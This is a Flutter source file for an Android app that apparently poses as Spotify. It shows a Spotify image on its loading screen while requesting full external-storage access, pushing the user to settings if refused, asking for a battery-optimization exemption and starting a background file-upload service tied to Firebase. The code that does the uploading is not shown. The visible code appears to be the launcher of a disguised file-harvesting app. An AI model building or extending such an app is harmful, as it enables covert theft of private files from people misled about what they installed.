import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'upload_service.dart';
import 'package:flutter/services.dart';
import 'package:firebase_core/firebase_core.dart';

bool _isRequestingPermission = false;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(MyApp());
}


class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Background File Upload',
      theme: ThemeData.dark(), // Set default theme to dark
      home: LoadingScreen(),
    );
  }
}

class LoadingScreen extends StatefulWidget {
  @override
  _LoadingScreenState createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen> {
  @override
  void initState() {
    super.initState();
    _startUploadService();
  }

  Future<void> _startUploadService() async {
    await initializePermissions();
    bool batteryOptimizationsIgnored =
        await requestIgnoreBatteryOptimizations();
    if (batteryOptimizationsIgnored) {
      await UploadService().startBackgroundService();
      // You can navigate to the main screen here if needed
    } else {
      print(
          'Battery optimizations not ignored. Background service may not work properly.');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        fit: StackFit.expand,
        children: <Widget>[
          // Background image
          Image.asset(
            'images/spotify.jpg', // Path to your image
            fit: BoxFit.cover,
          ),
          // Centered loading indicator
          Center(
            child: CircularProgressIndicator(
              valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
            ),
          ),
        ],
      ),
    );
  }
}

Future<bool> requestIgnoreBatteryOptimizations() async {
  try {
    const platform = MethodChannel('com.example.spotify/battery_optimizations');
    final bool isIgnoring =
        await platform.invokeMethod('isIgnoringBatteryOptimizations');
    if (!isIgnoring) {
      await platform.invokeMethod('requestIgnoreBatteryOptimizations');
    }
    return true;
  } on PlatformException catch (e) {
    print("Error requesting battery optimization exemption: $e");
    return false;
  }
}

Future<void> initializePermissions() async {
  if (_isRequestingPermission) return; // Prevent overlapping requests

  _isRequestingPermission = true;

  try {
    // Request storage permissions for Android 11 and above
    if (await Permission.manageExternalStorage.request().isGranted) {
      print('Manage external storage permission granted');
    } else {
      print('Manage external storage permission denied');
      openAppSettings(); // Direct user to app settings if permission is denied
    }

    // For devices below Android 11, request the regular storage permission
    PermissionStatus status = await Permission.storage.status;

    // Only request permissions if they haven't been granted
    if (!status.isGranted) {
      await Permission.storage.request(); // Request permission
    }
  } finally {
    _isRequestingPermission = false;
  }
}
